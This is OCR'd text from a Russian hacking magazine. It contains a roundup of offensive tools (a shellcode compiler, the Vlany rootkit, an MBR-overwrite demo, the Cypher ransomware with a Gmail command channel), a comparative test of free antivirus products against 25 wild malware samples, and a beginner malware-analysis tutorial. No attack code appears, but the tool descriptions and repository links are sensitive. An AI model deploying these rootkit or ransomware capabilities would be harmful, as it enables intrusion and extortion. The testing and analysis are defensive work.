wePWNise                       WePWNise понимает  как  32-,  так и 64-бит-
                     ный raw-формат полезных нагрузок для того, что-
                    бы быть в рабочем состоянии, когда он попадает
                       на заранее неизвестную цель (с точки зрения ар-
                           хитектуры). Однако если требуется только архитек-
                         тура x86, то все равно должна быть некая заглушка
                       для архитектуры x64.




                 SHELLCODE COMPILER
                          Shellcode Compiler — это небольшая программа,
                        которая компилирует код в стиле C/C++ в миниа-
                       тюрный, позиционно независимый (PIC, position-
                          independent)  и  без  NULL-значений  шелл-код
                       для Windows. На текущий момент он с легкостью
                        позволяет вызывать любые Windows  API функ-
                         ции. К сожалению, обрабатывать условия и циклы
                      он не умеет — внутренний язык написания шелл-ко-
                       дов не позволяет этого, но так как проект с открытым
Автор:                      исходным кодом, то можно расширить поддержку
Ionut Popescu                        внутреннего представления данного компилятора
                        шелл-кода.
URL:                            Shellcode Compiler принимает на вход исходный
github.com/NytroRST/                        файл, использует собственный компилятор для ин-
ShellcodeCompiler                       терпретации кода и генерирует ассемблерный ли-
                           стинг, который собирается с помощью NASM.
Система:                       Пример использования:
Windows
                        ShellcodeCompiler.exe -r Source.txt -o
                            Shellcode.bin -a Assembly.asm

                      Текущие ограничения:
                         •  не  умеет  взаимодействовать  с  return  value
                            от API-вызовов;
                         •  не умеет взаимодействовать с указателями и бу-
                         ферами;
                         •  не поддерживает переменные.

                     Все эти упущения обещают исправить как можно
                         скорее. Однако есть и другие ограничения, все же
                         это пока только альфа-версия. Если обнаружишь
                         какие-то баги — смело пиши разработчикам.
                         Данная разработка впервые была представле-
                       на на конференции DefCamp в Румынии в ноябре
                         2016-го.




                  LINUX LD_PRELOAD ROOTKIT
                           Vlany — это Linux-руткит, базирующийся на LD_
                     PRELOAD, для архитектур x86, x86_64 и ARM.
                          Особенности:
                         •  скрытие процессов;
                         •  скрытие пользователей в системе;
                         •  скрытие сетевой деятельности;
                         •  LXC-контейнер;
                         •  антиотладка;
                         •  антифорензика;
Автор:                         •  стойкость к удалению;
mempodippy                         •  модификация динамического линкера;
                         •  бэкдоры: accept() (взят из Jynx2), PAM-бэкдор,
URL:                    PAM auth логгер;
github.com/mempodippy/                         •  набор специализированных команд.
vlany
                      Более подробно обо всем можно узнать из описа-
                          ния. Находится в активной стадии разработки.




               PWN-MBR
                       Простая демонстрация подмены MBR.

                   Фаза 1: инъекция
                      Зловредный бинарник запускается с привилегиями
                               root. Исходная MBR копируется в другое свобод-
                      ное место (первый сектор, полностью содержащий
                          нули) на диске до первого раздела. Boot-сектор пе-
                       резаписывается вредоносным кодом.

Автор:                   Фаза 2: выполнение
NullArray                  В следующий раз при перезагрузке BIOS начнет
                       исполнение пейлоада. В примере на GitHub у тебя
URL:                        высветится текст MBR PWNED! несколько сотен
github.com/                          раз. Пейлоад определяет местоположение исход-
DavidBuchanan314/pwn-mbr                        ного boot-сектора (по magic number) и копирует его
                       на свое законное место (0x7C00). Однако раньше
Система:                       там располагался пейлоад, поэтому прежде он ко-
Windows/Linux                        пирует себя в другое место. Наконец, пейлоад пе-
                        реходит обратно на адрес 0x7C00, и загрузка про-
                       должается в обычном режиме.




                CYPHER
                        Cypher — демонстрационный пример ransomware,
                         то есть вредоносного программного обеспече-
                          ния, предназначенного для вымогательства. Напи-
                       сан с использованием PyCrypto и использует Gmail
                          как командный сервер. Проект находится в стадии
                        активной разработки.
                       При заражении каждой машине присваивает-
                        ся уникальный ID, который будет выслан вместе
                       с ключом шифрования на почтовый адрес Gmail.
URL:                      После этого Cypher определит, какие файлы нужно
github.com/NullArray/Cypher                       зашифровать, и начнет собственно шифрование.
                      Процесс распараллеливается, поэтому достигает-
                        ся высокая скорость. В последней версии добав-
                       лена функция перезаписи исходной MBR.
                    В итоге Cypher создаст файл README, в кото-
                    ром будут даны указания для получения ключа рас-
                      шифрования.
MALWARE
БЕСПЛАТНЫЕ

                                                                                        84ckf1r3
                                                                                            84ckf1r3@gmail.comАНТИВИРУСЫ:
ПОСЛЕДНИЙ
БОЙ





ТЕСТИРУЕМ
BITDEFENDER ANTIVIRUS FREE EDITION,
CLEARSIGHT ANTIVIRUS LITE FOR HOME,
RISING INTERNET SECURITY PERSONAL
И ROBOSCAN INTERNET SECURITY FREE



«Тесты аверов? Опять двадцать пять!» —
скажешь ты, и будешь совершенно прав.
Именно двадцать пять разных угроз мы
                                               WARNING
подготовили на этот раз, полностью из-
                                                                      Дорогой и любимый чи-
менив методику проверки бесплатных              татель! По закону жанра
антивирусов. Эта статья — заключитель-         здесь надо написать                                                                        страшное предупре-
ная в нашем цикле, а последний бой —             ждение, пугающее                                                                          ньюфагов, но ты ведь
он трудный самый!                                           не вчера родился — сам                                                                              все понимаешь.

КАК МЫ ТЕСТИРОВАЛИ
Следуя давно отработанной стратегии, мы использовали клоны чистой вирту-
алки, обеспечивающие равные условия для тестируемых антивирусов. Сама
же проверка в этот раз была устроена иначе. Мы отобрали 25 самых интерес-
ных зловредов и разделили бой аверов с ними на два раунда. В первом из них
антивирус должен просто распознать дремлющее зло, лежащее на диске в от-
крытом виде или прячущееся в многоуровневом архиве. Во втором — сразить-
ся с отрядом малвари за контроль над операционкой, имея фору в виде пред-
варительного запуска.
  Все зловреды были отобраны случайным образом и только среди распро-
страняемых в диком виде. Они загружались в ноябре с разных источников
и без использования какого-то эталонного антивируса в качестве распозна-
валки. Арбитром был Hex-редактор и ресурс VirusTotal, на котором сейчас за-
действованы более полусотни антивирусных движков. Поскольку все вредоно-
сы собирались с подозрительных сайтов и вытряхивались из почты накануне
тестов, среди них есть и новые образцы, которые пока мало кто определяет.
   Бытует мнение, что всякая малварь — это удел Windows, а Linux и дру-
гие UNIX-подобные операционки имеют к ней врожденный иммунитет. По-
этому мы включили в подборку не только виндовые бэкдоры, трояны и рут-
киты, но и несколько зловредов для Linux, Android и macOS. Качественный
антивирус должен уметь распознавать заразу в любом обличии, тем более
что кросс-платформенные сценарии заражения часто встречаются на прак-
тике. Подключаешь к инфицированному компу с Windows свой Android-смарт-
фон, и он уже протроянен.
   Как всегда, тестовой средой служили идентичные виртуалки Windows 10 Pro
x86 с последними обновлениями. «Защитник Windows» и фильтр SmartScreen
были отключены, а UAC, который мы с Алисой ⓕⓤⓒⓚ в недавней статье, оставался
активным. Последние версии бесплатных антивирусов загружались с офици-
альных сайтов, а их базы обновлялись непосредственно перед началом экспе-
римента.


ПОЛНЫЙ АРХИВ НАШИХ ТЕСТОВ БЕСПЛАТНЫХ АНТИВИРУСОВ
1. Тест Kaspersky Free, Avira Free, AVG Free и Avast! Free
2. Тест Comodo, Qihoo 360, Panda и Windows Defender
3. Clam Sentinel, FortiClient, Tencent и NANO Антивирус
4. Тест Ad-Aware, Crystal Security, Sophos Home и ZoneAlarm + Firewall
5. Тест Anvi Smart Defender Free, Baidu Antivirus, Immunet AntiVirus и Zillya!


ОТРЯД САМОУБИЙЦ
Тестовая подборка была сформирована из малвари четырнадцати разных ти-
пов. В отряд специального назначения вошла пара зловредов для ОС Android,
три для Linux и один для macOS. Остальные вредоносы предназначались
для Windows. Среди них есть три бэкдора, два руткита, два сетевых червя, один
вирус в истинном значении слова и одиннадцать троянов всех мастей. Ссылки
на их описание в VirsutTotal представлены ниже:
1. Android-01.tst
2. Android-02.tst
3. Linux-01.tst
4. Linux-02.tst
5. Linux-03.tst
6. OSX.tst
7. Win32-Backdoor-01.tst
8. Win32-Backdoor-02.tst
9. Win32-Backdoor-03.tst
10. Win32-Rootkit-01.tst
11. Win32-Rootkit-02.tst
12. Win32-Trojan-Banker.tst
13. Win32-Trojan-Graftor.tst
14. Win32-Trojan-JS.tst
15. Win32-Trojan-MBR.tst
16. Win32-Trojan-Ransom-01.tst
17. Win32-Trojan-Ransom-02.tst
18. Win32-Trojan-Spy-01.tst
19. Win32-Trojan-Spy-02.tst
20. Win32-Trojan-Spy-03.tst
21. Win32-Trojan-StartPage.tst
22. Win32-Trojan-Yakes.tst
23. Win32-Virus.tst
24. Win32-Worm-01.tst
25. Win32-Worm-02.tst

BITDEFENDER ANTIVIRUS FREE EDITIONА
Программа очень скромно рекламирует себя как «лучший из бесплатных ан-
тивирусов». После установки она подчеркивает свое преимущество над AVG,
Avira и Avast!, демонстрируя график с какими-то показателями эффективности
в попугаях.





                                                     Скромный Bitdefender

Раунд 1
Bitdefender в первом раунде не определил вообще ни одной тестовой угро-
зы — здесь даже не о чем писать. Мы пробовали давать малварь на проверку
из контекстного меню по одной и скармливать антивирусу весь каталог с ними
скопом — без разницы.
   Вероятно, провал в первом раунде случился потому, что у Bitdefender фай-
лы проверяются по расширению, а оно у всех образцов было .tst. Как заста-
вить Bitdefender проверять все файлы подряд (хотя бы в режиме выборочного
сканирования по запросу) — мы не нашли. Похоже, что настроек у него нет во-
обще — ни локально, ни через веб-интерфейс.





                                                      Настройки — это скучно

У большинства же других антивирусов выборочная проверка по запросу при-
водит к полному анализу указанных объектов — вне зависимости от общих на-
строек полной и быстрой проверки.
  Нам потребовалось вручную переименовать всех зловредов в тесто-
вой подборке, заменив им расширение tst на исполняемые. После этого
Bitdefender смог обнаружить 9 из 25 угроз.





                                                   Bitdefender обнаружил 36% зловредов

Карантин у этого антивируса тоже работает своеобразно. Все инфицирован-
ные файлы остаются на месте с родными именами. Просто к ним добавляется
пятизначный индекс и расширение .GZQUR.
   Однако Bitdefender блестяще справился с проверкой многоуровневых ар-
хивов! Он обнаружил вредоносов даже в семислойной «матрешке» (7Z-WIM-
CAB-GZ-TAR-RAR-ZIP) и поместил архив в карантин.





                                                Bitdefender умеет разбирать «матрешки»

Раунд 2
Мы создали отдельный каталог, куда поместили всех зловредов, не распоз-
нанных Bitdefender в первом раунде. Стали запускать их по одному. Примерно
спустя десять секунд антивирус начал рапортовать о блокировании вредонос-
ных процессов. Сообщения были однотипные, просто увеличивался счетчик
детектов.
   Bitdefender выгружал зловредов из оперативной памяти и предлагал уда-
лять их файлы. Примерно через полторы минуты была распознана вся остав-
шаяся малварь — видимо, сработала облачная проверка. Какие-то угрозы
он предложил удалить немедленно (мы согласились), а другие — поместить
в карантин. Один из троянов (JS) успел создать ярлык во временном каталоге
пользователя, который тоже был удален антивирусом.





                                                     Реабилитация Bitdefender

Был такой фильм — «ЗащитнеГ» (Defendor) — про парня, который мечтал стать
супергероем. Он ждал удобного случая и ввязывался в драки, поэтому часто
ходил побитым. Со временем он научился самообороне, хоть героем и не стал.
Вот и наш «Защитник (каждого) бита» его здорово напо-
минает своим поведением. Он вроде бы настроен реши-
тельно, но соображает так медленно, будто ему не раз
по голове настучали.
  Больше половины тестовых угроз (16 всего и 10, если
считать только виндовые) были им проигнорированы
дважды: когда мы копировали их на диск и когда просили     WARNING
Bitdefender просканировать каталог, заведомо содержа-                                                                            Искать вирусы в Сети —
щий только зловредов. Антивирус очнулся, только когда                                                                         не лучшая идея. Лучше
мы вручную запустили всю пропущенную им малварь. Тог-    сделай так, чтобы они
                                                                          не нашли твой комп,да сработал поведенческий анализатор и подоспели ре-
                                                                           роутер и всякие гаджеты
зультаты облачной проверки. Заражения системы в итоге                                                                                         (а если и нашли, то себе
не произошло, но что мешало предотвратить его раньше?        на погибель).

CLEARSIGHT ANTIVIRUS LITE FOR HOME
Сначала мы хотели протестировать Preventon Antivirus Free, но «предотвраще-
ние антивируса бесплатно» оправдывает свое название. Эта программа дей-
ствительно бесплатно предотвращает установку антивируса. Сначала на офи-
циальном сайте мы получили сообщение «403 Forbidden» при попытке скачать
дистрибутив.





                                                 Скачивать антивирус запрещено!

Хотели было уже тестировать платную версию в триал-режиме, но ее установ-
щик сообщил о несовместимости с Windows Defender. Выяснилось, что у ан-
тивируса Prevention вообще отозвали сертификат поддержки Windows 10,
а правила лицензирования изменились. Теперь, чтобы установить бесплатный
антивирус Preventon, нужно сперва месяц пользоваться платным в тестовом
режиме. Во всяком случае, так указано на форуме — оперативно связаться
с техподдержкой не удалось.





                                      Preventon не может отключить Windows Defender

Видя столько странных преград, мы решили заменить Preventon на другой ан-
тивирус с тем же движком от Sophos — Clearsight Antivirus Lite for Home. У них
даже пользовательский интерфейс практически одинаковый и все служебные
сообщения.





                                                     Найди десять отличий

Сперва решили проверить скачанный дистрибутив на VirusTotal и улыбнулись,
увидев, что Dr.Web распознает творение Clearsight как потенциально нежела-
тельную программу.
  Во время установки антивирус Clearsight также сообщил, что несовместим
с Windows Defender. Поскольку речь здесь о конфликте компонентов защиты
в реальном времени, мы просто убедились, что Windows Defender отключен.
Точнее, постоянно это проверяли — он любит восстанавливать свою актив-
ность по-тихому. Вырезать же его из системы совсем не хотелось — это бы
изменило условия тестов.
  При первом запуске антивирус Clearsight долго обновлял свои базы и мо-
дули — минут восемь на быстрой выделенке. В бесплатной версии доступны
лишь самые основные настройки. Все расширенные — только для версий Pro
и Premium.

Раунд 1
Выборочное сканирование каталога с образцами шло очень долго. Антивирус
затрачивал в среднем 12 секунд на проверку одного файла. Примерно столь-
ко же занимала у нас ручная загрузка образцов на VirusTotal и ожидание про-
верки онлайн.





                                         Проверка 25 файлов заняла 363 секунды

Сначала антивирус Clearsight показал название каждого проверяемого файла
в графе «сканирование» и не нашел ничего. Затем автоматически последовал
второй этап проверки. За следующие две минуты антивирус нашел и поместил
в карантин 22 зловреда из 25. Антивирус Clearsight показывает в счетчике про-
веренных объектов все файловые компоненты, поэтому их в статистике ото-
бражается не двадцать пять, а больше сотни.
   Архивную «матрешку» с пятью уровнями вложений антивирус Clearsight
успешно проверил. Он быстро распознал в ней заразу (эффект повторного
сканирования тех же файлов, хоть и в упаковке) и удалил архив. С дополни-
тельными слоями (WIM и 7Z) он уже не справился.
   Антивирусом Clearsight были обнаружены все вредоносы для других опе-
рационок. Нераспознанными остались только Win32-Backdoor-02.tst, Win32-
Trojan-Graftor.tst и Win32-Trojan-Spy-03.tst. Мы переименовали их, присвоив
истинные расширения, и запустили.





                                              Из 25 вредоносов остались три

Раунд 2
Пока файлы переименовывали, защита в реальном времени была отключе-
на, чем воспользовался Windows Defender. Он самостоятельно восстановился
и тут же сообщил об удалении трояна Graftor. Пришлось снова отключать «За-
щитник Windows», восстанавливать тестовый файл и активировать компоненты
Clearsight.
   Скрипт PHP открылся в браузере для просмотра — очевидно, что это
не привело к заражению системы, но, попадись при веб-серфинге этот скрипт
на инфицированном сайте, все было бы иначе. Троян Graftor не смог стар-
товать из-за отсутствия в Windows 10 нужных ему компонентов. Другой тро-
ян-шпион благополучно загрузился и установил подключение к индийскому
серверу через explorer.exe.





                                                        Шпион, выйди вон!

Итог: Clearsight Antivirus Lite for Home показал хорошее число детектов (92%),
распознав даже вредоносов для других операционок. Однако он все же пропу-
стил одного виндового трояна и позволил ему хозяйничать в тестовой системе.
Также этот антивирус исключительно долго проверяет файлы. За то время, пока
Clearsight Antivirus Lite for Home сканирует один файл, другие успевают прове-
рить несколько десятков без заметного ущерба для качества обнаружения.
   Вдобавок антивирус Clearsight очень долго загружается после перезапу-
ска Windows. Сначала он запускает интерфейс, в котором показывает, что за-
щита в реальном времени неактивна. Затем пробует включить ее, отключает
снова и ждет отключения Windows Defender. После этого перезапускает свой
модуль. Все это занимает секунд десять-двенадцать, и этим временем вполне
может воспользоваться малварь. В целом очень странно наблюдать конфлик-
ты с Windows Defender. Другие антивирусы обычно отключают его, и он не пы-
тается перезапуститься самостоятельно.



                           Продолжение статьи
MALWARE

     Начало статьи
                                           ТЕСТИРУЕМ
                                          BITDEFENDER
                                              ANTIVIRUS FREE
                                                 EDITION,БЕСПЛАТНЫЕ    CLEARSIGHT
                                              ANTIVIRUS LITE
                                        FOR HOME,
                                               RISING INTERNET
                                            SECURITYАНТИВИРУСЫ:                                        PERSONAL
                                       И ROBOSCAN
                                            INTERNET
                                            SECURITY FREEПОСЛЕДНИЙ БОЙ



RISING INTERNET SECURITY PERSONAL V. 23.01.77.50
Активная разработка Rising ISP прекратилась в 2011 году, но его базы обнов-
ляются и по сей день. Многие ставят его потому, что он официально распро-
страняется бесплатно и не требует регистрации (а еще в нем есть мультяшный
львенок — друг Скрепыша).
   Устанавливается дистрибутив за пару минут. В меню установки доступ-
ны три языка: два иероглифических и английский. К сожалению, с Windows 8
и новее Rising ISP несовместим. Он устанавливается в «десятке», но затем
не может использовать свой основной компонент защиты в реальном време-
ни — RawMonD.exe. Поэтому мы решили сделать для Rising ISP исключение
и запустить его в чистой Windows XP SP3.





                                                        Rising ISP не работает в Windows 10

Раунд 1
Rising Internet Security Personal обнаружил 8 зловредов из 25, когда они просто
лежали в отдельном каталоге. Нашлись только некоторые виндовые вредоносы
(8 из 19), а всю малварь для других операционок антивирус проигнорировал.





                                                            Rising определил 32% малвари

По отдельности архивы ZIP, RAR, GZ, TAR и CAB он также проверил без про-
блем и везде находил аналогичное количество зловредов — восемь штук.
При этом число зараженных объектов указывалось гораздо больше, поскольку
антивирус ругался еще и на каждый компонент внутри файла.
  Многие антивирусы перестают проверять файлы, если они находятся
в многослойных архивах. Например, сначала упакованы в ZIP, потом ZIP поме-
щен в RAR, RAR — в TAR и так далее. Rising ISP успешно справился с архивной
«матрешкой» вплоть до пятого уровня вложенности (CAB-GZ-TAR-RAR-ZIP).
Правда, он путался в относительных путях и часто указывал на тот же файл по-
вторно, словно он существует на всех уровнях сразу. Дополнительные слои
упаковки (7Z и WIM) Rising снять уже не смог, как и проверить образ WIM от-
дельно. Возможно, с другими форматами он бы улучшил результат.





                                               Rising — проверка многоуровневого архива

Раунд 2
Все образцы, которые Rising ISP не определил в первом раунде, мы поме-
стили в отдельный каталог. Затем присвоили ими первоначальные расшире-
ния (.js, .php, .exe вместо .tst). Уже в этот момент Rising среагировал на Win32-
Backdoor-02.php, распознав в нем IRC-бэкдор. При запуске проверки всего
каталога других зловредов он так и не обнаружил. Попробуем запустить их?





                               Rising ISP определил бэкдор после изменения расширения

При запуске Win32-Backdoor-01.exe Rising определил его как неизвестный тро-
ян и предложил удалить. То же самое произошло и с Win32-Rootkit-01.exe.





                                                     Rising определил бэкдор при запуске

Следующие зловреды не смогли запуститься в Windows XP: Win32-Trojan-
Banker.exe и Win32-Trojan-Graftor.exe. Им не хватало библиотек и других стан-
дартных компонентов.
   Успешно запустился и установил сетевое подключение к узлу 211.103.159.80
джава-скрипт Win32-Trojan-JS.js. Rising ISP в это время молчал.





                                                       Trojan-JS установил подключение

Win32-Trojan-MBR.exe запустился в командной строке, внедрился в систем-
ные процессы, прописался на автозапуск и открыл кучу сетевых подключений.





                                                  Trojan-MBR внедрился в систему

Львенок Rising наблюдал за этим с интересом, но не шелохнулся.





                                             Trojan-MBR прописался на автозапуск

Шпион Win32-Trojan-Spy-01.exe запустился и записал файлы кейлоггера
в C:\Windows\system32\. Rising их распознал и частично удалил, но сам уста-
новочный пакет трояна не тронул. Его можно было запустить повторно.





                                                    Частичный детект трояна

До удаления троян успел создать пункт автозапуска в секции реестра HKLM\
Software\Microsoft\Windows\CurrentVersion\Run,  сделать  свои  копии
и защитить созданный каталог от удаления. Затем троян открыл сетевой порт
UDP 57965. Rising ISP обнаружил это и предложил заблокировать процесс.
После блокировки троянский процесс появлялся в оперативной памяти снова,
открывал другой порт UDP, и Rising ISP ругался опять.





                                                                                     Rising

Через минуту его активность была видна уже невооруженным глазом. В скры-
том подкаталоге \System32\28463\ лежали десятки скриншотов, ожидающих
отправки через интернет.





                                          Троян делает скриншоты, а Rising молчит

Другой шпион — Win32-Trojan-Spy-03 запустился и тихо открыл UDP-порт
62180. Rising определил это как вредоносную активность и смог лишь бло-
кировать трафик, но не удалить трояна. Следом беспрепятственно запусти-
лись Win32-Trojan-StartPage и Win32-Worm-02. Они вступили в бой с другими
зловредами за системные ресурсы и привели к многочисленным ошибкам
в работе Windows XP. Rising ISP все это время молчал, а его счастливый льве-
нок дрых и пускал пузыри.





                                       Проблемы юзеров львенка не волнуют!

Итог: 8 из 25 зловредов были обнаружены Rising Internet Security Personal
при ручном сканировании каталога с подборкой по запросу. Еще один зловред
нашелся антивирусом автоматически после изменения расширения тестового
файла. У четырех запущенных троянов встроенный в Rising ISP файрвол блоки-
ровал сетевую активность, но антивирус не смог ни выгрузить троянские про-
цессы из памяти, ни удалить сами вредоносные файлы. Четыре других трояна
вообще запустились незаметно для Rising ISP.
  На русский язык Rising можно перевести как «поднимающийся». Уж не знаю,
что там у его разработчиков поднимается, но точно не программерский скилл.

ROBOSCAN INTERNET SECURITY FREE V.2.5.0.21
После установки антивируса от All Tools запустилось обновление, а мы ушли
спать. Скачать предстояло 1220 файлов, и заняло это больше получаса.





                                                        Обновление Roboscan

Проверив настройки (по умолчанию все было включено), мы запустили скани-
рование по запросу. Roboscan подумал секунду и нашел ноль угроз из двадца-
ти пяти. Изменили расширения у файлов тестовой подборки и снова запустили
проверку. Сначала из контекстного меню, а затем из интерфейса антивиру-
са — по нулям. Корейский антивирус не видел зловредов в упор и, похоже, во-
обще не сканировал тестовый каталог. Про архивы и говорить нечего.





                                                                          ZeroDetect
РАУНД 2
Мы запускали зловредов по одному и наблюдали за их поведением. Вот появил-
ся новый процесс, вот создано сетевое подключение, вот он прописался на ав-
тозапуск... скукота! Roboscan полностью игнорировал активность малвари.





                                                 Roboscan не интересует малварь


Итог: 0 из 25. Официально поддержка Windows 10 в Roboscan не заявлена,
однако она есть для Windows 8. Никаких предупреждений и ошибок антивирус
в «десятке» не показывает — ни при установке, ни во время работы. Если это,
конечно, можно назвать работой. На всякий случай мы проверили этот антиви-
рус также и в Windows XP.

ROBOSCAN В WINDOWS XP
В Windows XP для Roboscan удалось включить получение обновлений через
пиринговую сеть. Новые базы и модули скачались чуть быстрее — за 24 мину-
ты. Проверка каталога со зловредами ничего не дала. Roboscan игнорировал
их с любыми расширениями, по отдельности и в архивах. Во втором раунде мы
запустили большую часть вредоносов, которые устроили групповое изнасило-
вание винды. Roboscan молчал и делал вид, что все в порядке. Он только кру-
тил рекламу какой-то игры в своем окне и в трее. Кажется, там было написано
что-то вроде «Слава роботам! Убить всех людей!».





                                                              Слава роботам!

ВЫВОДЫ
За последние полгода мы протестировали 24 бесплатных антивируса. Только
отдельные из них оказались довольно качественным продуктом, а большая
часть — продуктом жизнедеятельности программистов.
   Некоторые нарекания были и к условным лидерам, но по-
бедителей не судят. Во всяком случае, не судят строго. В це-
лом хорошо себя показали следующие антивирусы: AVG
Free, Bitdefender, FortiClient, Kaspersky Free и Sophos Home.
Лично мне больше всех понравились два последних. «Кас-
перский» в представлении не нуждается, а в Sophos Home
                                    WWWподкупило управление настройками сразу на нескольких
компьютерах через веб-интерфейс и единую учетную за-                                                                                            Bitdefender
пись. Идеальный вариант, чтобы поставить на компьютер        Antivirus Free
детям и ведущим себя словно дети сотрудникам.                          Edition (exe)
   Кстати, этим летом компанию AVG Technologies приобре-                                                                                                Clearsight
ла Avast Software, лишив нас одного из поводов для холивара.       Antivirus Lite for
Может, и сбор «статистики» их новый антивирус поумерит?         Home (exe)
   Обрати внимание: в основном мы проверяли защиту
                                                                                             Rising Internet
от различных веб-угроз. Как эти антивирусы проверяют по-                                                                                           Security Personal
чту, насколько эффективно распознают руткиты и многие             (exe)
другие вопросы остались за рамками наших тестов. Их зада-
                                                                           Roboscan Internetча была в том, чтобы дать общее представление о бесплат-                                                                                          Security Free (exe)
ных антивирусах и проверить их способность сдерживать
наплыв малвари из интернета, пока юзер кликает в браузере
на все подряд. Большинство из проверенных нами антиви-
русов с такой задачей не справились. По своей эффектив-
ности они часто уступали даже «Защитнику Windows», кото-
рый отключали при установке.
MALWARE





                                                                              Иван Пискунов
                                                                                                   www.ipiskunov.blogspot.com,
                                                                                             g14vano@gmail.com

REVERSING
MALWARE
ДЛЯ НАЧИНАЮЩИХ
  ЧАСТЬ 1: ПРАКТИЧЕСКИЙ АНАЛИЗ


С прошлого номера мы запустили цикл
статей про такую интересную вайтхет-от-
расль, как анализ малвари. Интересно
в ней то, что исследователь малвари за-        WARNING
                                                                    Вся информация предо-нимается все тем же взломом, причем
                                                                           ставлена исключитель-
                                                                       но в ознакомительныхпрограмм, авторы которых не очень хо-
                                                                                целях. Ни редакция,
тели бы, чтобы их творения взламыва-           ни автор не несут ответ-
                                                                            ственности за любой
ли :), но при этом хакеру-исследователю        возможный вред, при-
                                                                     чиненный материалами
совершенно не стоит опасаться юриди-            данной статьи.
ческих претензий от авторов малвари.
В прошлой статье мы разобрали теоретические вопросы,
литературу и хорошие онлайн-ресурсы, а сегодня, дорогие
друзья, будем практиковаться в анализе malware-кода, ос-
новываясь на рабочих образцах вредоносов.

ПОДГОТОВКА РАБОЧЕГО ОКРУЖЕНИЯ
Все эксперименты по анализу малвари мы будем выполнять в нашей лабора-
тории, это заранее подготовленная виртуальная среда с предустановленной
Windows XP. Да-да, старушка ХР нам очень даже подойдет, поскольку некото-
рые изучаемые образцы могут вызывать ошибки при запуске на новых версиях
ОС. И к тому же все программные инструменты проверены и гарантированно
будут работать на ХР.
  Образцы малвари, приведенной в этой статье, можно найти здесь. Каждый
изучаемый бинарный код вредоноса мы будем называть лабами (Labs). Пом-
ни, при распаковке архива с лабами антивирус будет распознавать файлы со-
ответствующим образом, что, если вдуматься, очень логично :).
  И еще один совет. Поскольку мы будем запускать малварь, выполнять код
пошагово в отладчике или мониторить активность вредоноса в системе, в ре-
зультате этих действий может пострадать операционная система, а именно
реестр, системные файлы и прочее. Поэтому перед началом любых экспери-
ментов рекомендуем создавать снимки системы (snapshots) для быстрого от-
ката в случае необходимости.

АНАЛИЗ СЕМПЛА LAB01:
ДИНАМИЧЕСКИЙ АНАЛИЗ
Используемые инструменты:
•  IDA Pro;
•  PEiD;
•  RegShot;                                      WARNING
•  Procmon;                                                                      Вся информация предо-
•  INetSim;                                                                            ставлена исключитель-
•  Wireshark;                                                         но в ознакомительных
•  Process Explorer;                                                        целях. Ни редакция,
                                                                       ни автор не несут ответ-
•  OllyDbg.                                                                             ственности за любой
                                                                    возможный вред, при-
Итак, первым делом запускаем PEview и смотрим им-   чиненный материалами
                                                                           данной статьи.порт функций, который использует этот вредонос. Видим,
что используется функция ExitProcess из системной би-
блиотеки kernel32.





                      Просмотр функции ExitProcess системной библиотеки kernel32

А вот и сам импорт в подробностях:





                      Окно PEview с подробностями импорта

Так-так, мы видим ключи реестра, которые прописывает вредонос после сво-
его запуска. Обращаем внимание на присутствие некоторой DNS-записи
веб-ресурса и создаваемый файл vmx32to64.exe, маскирующийся под драй-
вер видеоадаптера с именем WinVMX32.
   У нас есть подсказка, мы должны отследить сетевую активность ре-
сурса  http://www.practicalmalwareanalysis.com. Мы можем также отслежи-
вать и  проверять  ключи  реестра  SOFTWARE\Classes\http\shell\open\
commandV (IExplorer.exe) и Software\Microsoft\Active  Setup\Installed
Components\.
  Первым делом мы должны разобраться с файлом для vmx32to64.exe, ко-
торый вредонос создает после своего запуска и копирует в папку C:\Windows\
system32.
   Запускаем анализатор PEiD, видим, что файл ничем не упакован.


                                                          Анализ
                                                             бинарного файла
                                                                    с помощью PEiD





Однако используются некоторые фичи для затруднения отладки exe-файла.
Ниже приведен скриншот из отладчика OllyDbg.





                                          Просмотр malware в отладчике OllyDbg

По адресу 0x401259 был выполнен вызов к 0x401265. Это опкод, который вы-
зывает обратный адрес 0x40125e выполнения в стеке. По первому адресу,
0x401265, был сделан вызов к библиотеке kernel32.LoadLibraryA. Но мы-то
знаем, что функция LoadLibrary нуждается в некотором аргументе LPCSTR,
передаваемом в... массив символов! Обратный адрес 0x40125e заворачивает
вызов опкодом в библиотеку user32.

ПРОДОЛЖАЕМ ИССЛЕДОВАНИЕ. СМОТРИМ РЕЕСТР
Запускаем RegShot.





                                                        Результат анализа в RegShot

Из лога RegShot мы выяснили, что вредонос пытается выполнить команду C:\
WINDOWS\system32\vmx32to64.exe при своем запуске.
   Помним, что, помимо ключей реестра, в импорте мы нашли некую DNS-за-
пись веб-ресурса. Хотим узнать подробности?

ЗАПУСКАЕМ СЕТЕВУЮ АКУЛУ WIRESHARK





                                            Анализ сетевых пакетов в Wireshark

Мы видим запрос на сайт http://www.practicalmalwareanalysis.com и соедине-
ние SSL. Если приглядеться внимательно, то можно увидеть, что в пакетах TCP
присутствует отправка случайных 256 байт данных через порт 80 и 443.





                                         Передаваемые 256 байт в пакетах TCP


ЧТО НАМ ПОКАЖЕТ PROCESS EXPLORER?
Это окно с описанием мьютекса WinVMX32:





                                                 Описание мьютекса WinVMX32





                                                Строки, найденные при сканировании


Используя Process Explorer, мы можем видеть больше строк, содержащихся
в памяти и хендле мьютекса.




                                             Строки, отображаемые в Process Explorer


А вот и процедура записи файлов в Windows\system32\vmx32to64.exe:





                                           Процедура записи файлов в Windows


DANGER

Будь осторожен при скачивании и распаковке архивов с образцами malware
на твой компьютер. Все исследования выполняй только в изолированной вир-
туальной среде! Не выполняй действий, в которых на 100% не уверен. И делай
регулярные snapshot’ы системы для быстрого отката.



ВОЗВРАЩАЕМСЯ К OLLYDBG
Позиционируемся на функции LoadLibrary. Мы уже выяснили, что вредонос
на самом деле загружает эти библиотеки:
1. 0012EFC4 0040123C /CALL to LoadLibraryA from Lab03-01.00401236
    0012EFC8 0040122D \FileName = "advapi32"
2. 0012EFC4 00401253 /CALL to LoadLibraryA from Lab03-01.0040124D
    0012EFC8 00401247 \FileName = "ntdll"3.
3. 0012EFC4 0040126B /CALL to LoadLibraryA from Lab03-01.00401265
    0012EFC8 0040125E \FileName = "user32"
4. 0012EFC4 00401505 /CALL to LoadLibraryA from Lab03-01.004014FF
    0012EFC8 004014F7 \FileName = "advpack"

А что же с замаскированным файлом WinVMX32?
   Тут все просто: если vmx32to64.exe создан и находится в C:\WINDOWS\
system32, то, скорее всего, процесс запущен в памяти. Проверяем, открыт ли
мьютекс WinVMX32 в оперативной памяти.





                                                        Мьютекс WinVMX32
Нашли! Машина инфицирована.
